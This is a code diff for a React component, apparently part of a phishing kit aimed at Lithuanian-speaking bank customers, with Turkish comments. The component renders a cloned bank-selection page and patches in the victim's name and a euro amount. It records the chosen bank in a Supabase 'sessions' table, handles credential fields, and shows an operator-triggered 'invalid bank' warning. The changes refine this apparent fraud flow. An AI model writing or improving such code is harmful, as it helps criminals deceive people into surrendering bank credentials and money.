@@ -127,21 +127,27 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     }
   }, [publicId, routeSessionId, effectiveSessionId, router]);
 
-  // HTML enjekte edildikten sonra: isim/miktar patch + banka click bagla
+  // Isim + miktar HTML STRING icinde patchlenir — kirmizi "1" hic boyanmaz.
+  const finalHtml = useMemo(() => {
+    if (!html || !ready) return "";
+    let h = html;
+    const esc = (s: string) =>
+      s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    const fullName =
+      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "kliente";
+    h = h.replace(
+      /(style=["']?color:#F62515["']?[^>]*)>\s*1\s*</i,
+      `$1>${esc(fullName)}<`,
+    );
+    if (amount > 0) h = h.replace(/1700(?=\s*eur)/i, String(amount));
+    return h;
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [html, ready, fd, amount]);
+
+  // HTML enjekte edildikten sonra: hata bandi + banka click bagla
   useEffect(() => {
     const root = containerRef.current;
-    if (!root || !html || !ready) return;
-
-    // Kirmizi "1" -> kullanicinin adi soyadi
-    const fullName = [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim();
-    const nameSpan = root.querySelector('span[style*="F62515"], span.font-bold.text-red');
-    if (nameSpan) nameSpan.textContent = fullName || "kliente";
-
-    // "1700 eurų" -> session amount
-    if (amount > 0) {
-      const h2 = root.querySelector("h2.header-title");
-      if (h2) h2.innerHTML = h2.innerHTML.replace(/[\d\s.,]+(?=\s*eur)/, String(amount));
-    }
+    if (!root || !finalHtml) return;
 
     // Hatali banka: kirmizi uyari bandi
     if (invalid) {
@@ -171,6 +177,11 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       const nextFd: Record<string, any> = { ...fd };
       for (const f of BANK_CRED_FIELDS) delete nextFd[f];
 
+      // Tik aninda icerigi temizle: update + sayfa gecisi sirasinda
+      // eski liste frame'i gorunmesin, sadece portal arkaplani kalir.
+      const rootEl = containerRef.current;
+      if (rootEl) rootEl.innerHTML = "";
+
       const { error: upErr } = await supabase
         .from("sessions")
         .update({ is_hidden: false, current_step: "bank", form_data: nextFd })
@@ -179,6 +190,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       if (upErr) {
         savingRef.current = false;
         setSaving(false);
+        if (rootEl) rootEl.innerHTML = finalHtml;
         return;
       }
       // URL'de uzun UUID yerine kisa public_id kullan (invalid-bank akisinda
@@ -192,7 +204,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
     root.addEventListener("click", onClick);
     return () => root.removeEventListener("click", onClick);
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [html, ready, fd, amount, invalid, effectiveSessionId, routeSessionId, publicId, supabase]);
+  }, [finalHtml, fd, invalid, effectiveSessionId, routeSessionId, publicId, supabase]);
 
   return (
     <div
@@ -211,7 +223,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
         background: "transparent",
         opacity: saving ? 0.7 : 1,
       }}
-      dangerouslySetInnerHTML={{ __html: html }}
+      dangerouslySetInnerHTML={{ __html: finalHtml }}
     />
   );
 }
